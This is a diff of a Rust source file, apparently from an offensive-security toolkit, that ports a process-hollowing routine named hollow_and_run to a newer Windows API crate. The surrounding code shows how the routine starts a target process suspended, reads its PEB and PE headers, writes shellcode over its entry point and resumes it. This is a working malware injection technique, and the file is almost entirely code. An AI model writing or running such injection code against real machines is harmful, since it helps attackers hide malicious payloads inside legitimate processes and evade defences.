@@ -1,10 +1,11 @@
 use core::ffi::c_void;
 use std::ptr;
 use windows::core::{PCSTR, PSTR};
+use windows::Wdk::System::Threading::{NtQueryInformationProcess, PROCESSINFOCLASS};
 use windows::Win32::System::Diagnostics::Debug::{ReadProcessMemory, WriteProcessMemory};
 use windows::Win32::System::Threading::{
-    CreateProcessA, NtQueryInformationProcess, ResumeThread, CREATE_SUSPENDED, PROCESSINFOCLASS,
-    PROCESS_BASIC_INFORMATION, PROCESS_INFORMATION, STARTUPINFOA,
+    CreateProcessA, ResumeThread, CREATE_SUSPENDED, PROCESS_BASIC_INFORMATION, PROCESS_INFORMATION,
+    STARTUPINFOA,
 };
 
 const E_LFANEW_OFFSET: usize = 0x3C;
@@ -36,16 +37,16 @@ pub fn hollow_and_run(shellcode: &[u8], target_process: &str) {
             &mut process_information,
         )
     };
-    if !creation_result.as_bool() {
+    if creation_result.is_err() {
         panic!("Could not create the suspended {target_process} with CreateProcessA");
     }
 
-    // Get the PEB base address of the suspended process with ZwQueryInformationProcess
+    // Get the PEB base address of the suspended process with NtQueryInformationProcess
     // WINDOWS --> https://docs.microsoft.com/en-us/windows/win32/procthread/zwqueryinformationprocess
     // RUST --> https://microsoft.github.io/windows-docs-rs/doc/windows/Win32/System/Threading/fn.NtQueryInformationProcess.html
     let process_handle = process_information.hProcess;
     let mut basic_information = PROCESS_BASIC_INFORMATION::default();
-    if let Err(error) = unsafe {
+    if unsafe {
         NtQueryInformationProcess(
             process_handle,
             PROCESSINFOCLASS::default(),
@@ -53,8 +54,8 @@ pub fn hollow_and_run(shellcode: &[u8], target_process: &str) {
             POINTER_SIZE_TIMES_SIX,
             &mut 0_u32,
         )
-    } {
-        panic!("Could not get the entry point with ZwQueryInformationProcess: {error}");
+    }.is_err() {
+        panic!("Could not get the entry point with NtQueryInformationProcess");
     }
 
     // Use ReadProcessMemory to read 8 bytes of memory; the address of the code base
@@ -71,7 +72,7 @@ pub fn hollow_and_run(shellcode: &[u8], target_process: &str) {
             None,
         )
     };
-    if !read_result.as_bool() {
+    if read_result.is_err() {
         panic!("Could not read the address of the code base with ReadProcessMemory");
     }
 
@@ -88,7 +89,7 @@ pub fn hollow_and_run(shellcode: &[u8], target_process: &str) {
             None,
         )
     };
-    if !read_result.as_bool() {
+    if read_result.is_err() {
         panic!("Could not read the DOS header with ReadProcessMemory");
     } else if header_buffer[0] as char != 'M' || header_buffer[1] as char != 'Z' {
         panic!("An offset looks incorrect, the DOS header magic bytes don't correspond to 'MZ'");
@@ -110,7 +111,7 @@ pub fn hollow_and_run(shellcode: &[u8], target_process: &str) {
             None,
         )
     };
-    if !write_result.as_bool() {
+    if write_result.is_err() {
         panic!("Could not write the shellcode to the suspended {target_process} with WriteProcessMemory");
     }
 
